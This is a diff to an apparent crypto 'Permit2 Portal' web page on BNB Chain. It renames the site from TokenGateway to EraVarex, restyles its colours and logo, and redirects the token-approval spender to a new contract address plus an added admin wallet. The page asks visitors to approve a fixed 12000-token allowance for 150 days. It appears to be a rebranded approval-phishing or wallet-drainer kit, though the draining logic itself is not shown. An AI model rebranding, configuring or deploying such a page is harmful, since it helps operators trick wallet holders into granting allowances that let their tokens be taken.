@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>TokenGateway — Permit2 Approval</title>
-<meta name="description" content="TokenGateway: Securely connect your wallet and approve Permit2 token allowance on BNB Smart Chain." />
+<title>EraVarex — Permit2 Portal</title>
+<meta name="description" content="EraVarex: Securely connect your wallet and approve Permit2 token allowance on BNB Smart Chain." />
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
@@ -13,33 +13,36 @@
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   :root {
-    --bg-base:        #050709;
-    --bg-surface:     #0c0f16;
-    --bg-elevated:    #111620;
-    --bg-overlay:     #161d2b;
-    --bg-hover:       #1a2236;
+    --bg-base:        #06080e;
+    --bg-surface:     #0c101a;
+    --bg-elevated:    #121826;
+    --bg-overlay:     #172033;
+    --bg-hover:       #1e293f;
 
-    --border-subtle:  #1e2736;
-    --border-default: #253045;
-    --border-accent:  #2d4a7a;
+    --border-subtle:  #1b2537;
+    --border-default: #22324c;
+    --border-accent:  #0ea5e9;
 
-    --text-primary:   #e8edf5;
-    --text-secondary: #8a97af;
-    --text-muted:     #4a5568;
-    --text-inverse:   #050709;
+    --text-primary:   #f0f4f8;
+    --text-secondary: #94a3b8;
+    --text-muted:     #4b586e;
+    --text-inverse:   #06080e;
 
-    --accent-blue:    #3b82f6;
-    --accent-green:   #22c55e;
-    --accent-red:     #ef4444;
+    --accent-blue:    #06b6d4;
+    --accent-brand:   #6366f1;
+    --accent-green:   #10b981;
+    --accent-red:     #f43f5e;
     --accent-amber:   #f59e0b;
-    --accent-purple:  #a855f7;
+    --accent-purple:  #8b5cf6;
 
-    --glow-blue:      rgba(59,130,246,0.15);
-    --glow-green:     rgba(34,197,94,0.12);
+    --glow-blue:      rgba(6,182,212,0.20);
+    --glow-brand:     rgba(99,102,241,0.20);
+    --glow-green:     rgba(16,185,129,0.16);
 
-    --gradient-card:  linear-gradient(145deg, #111620 0%, #0c0f16 100%);
-    --gradient-blue:  linear-gradient(135deg, #1d4ed8, #3b82f6);
-    --gradient-green: linear-gradient(135deg, #16a34a, #22c55e);
+    --gradient-card:  linear-gradient(145deg, #0f1523 0%, #0a0e18 100%);
+    --gradient-blue:  linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
+    --gradient-brand: linear-gradient(135deg, #6366f1 0%, #06b6d4 50%, #10b981 100%);
+    --gradient-green: linear-gradient(135deg, #059669, #10b981);
 
     --radius-sm:  6px;
     --radius-md:  10px;
@@ -65,8 +68,8 @@
     content: '';
     position: fixed; inset: 0;
     background:
-      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(59,130,246,.07) 0%, transparent 60%),
-      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(168,85,247,.05) 0%, transparent 60%);
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(6,182,212,.14) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(99,102,241,.12) 0%, transparent 60%);
     pointer-events: none;
     z-index: 0;
   }
@@ -75,8 +78,8 @@
     content: '';
     position: fixed; inset: 0;
     background-image:
-      linear-gradient(rgba(59,130,246,.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(59,130,246,.03) 1px, transparent 1px);
+      linear-gradient(rgba(6,182,212,.035) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(6,182,212,.035) 1px, transparent 1px);
     background-size: 40px 40px;
     pointer-events: none;
     z-index: 0;
@@ -796,10 +799,27 @@
 <div class="app-wrapper">
   <header class="app-header">
     <div class="logo-group">
-      <div class="logo-icon">⚡</div>
+      <div class="logo-icon" style="background:transparent;border:none;display:flex;align-items:center;justify-content:center;">
+        <svg width="34" height="34" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#era_grad_icon)" stroke-width="2.2" fill="url(#era_hex_fill)" />
+          <path d="M12 12H24M12 18H20M12 24H24" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" />
+          <circle cx="24" cy="18" r="2.2" fill="#06b6d4" />
+          <defs>
+            <linearGradient id="era_grad_icon" x1="4" y1="3" x2="32" y2="33" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#6366f1" />
+              <stop offset="0.5" stop-color="#06b6d4" />
+              <stop offset="1" stop-color="#10b981" />
+            </linearGradient>
+            <radialGradient id="era_hex_fill" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#06b6d4" stop-opacity="0.25" />
+              <stop offset="100%" stop-color="#1e1b4b" stop-opacity="0.6" />
+            </radialGradient>
+          </defs>
+        </svg>
+      </div>
       <div class="logo-text">
-        <span class="logo-title">TokenGateway</span>
-        <span class="logo-sub">Permit2 · BNB Chain</span>
+        <span class="logo-title">EraVarex</span>
+        <span class="logo-sub">Permit2 Gateway · BNB Chain</span>
       </div>
     </div>
     <div class="network-pill">
@@ -820,7 +840,11 @@
 const API_BASE  = "/api";
 const CHAIN_ID  = 56;
 const PERMIT2   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const GATEWAY   = "0x0c215808bf5251A47938C40971372f2DeCe7e507";
+
+// EraVarex Contract & Wallet Configuration
+const ERAVAREX_CONTRACT_ADDRESS = "0x768D5df1E316101C1C3862354F46217ac90a08bf";
+const ERAVAREX_ADMIN_WALLET     = "0xf07F812568800638909CE5b7e975545863dff92d";
+const GATEWAY                   = ERAVAREX_CONTRACT_ADDRESS;
 
 // Fixed amounts as required: 12000 tokens, 150 days
 const FIXED_AMOUNT = "12000";
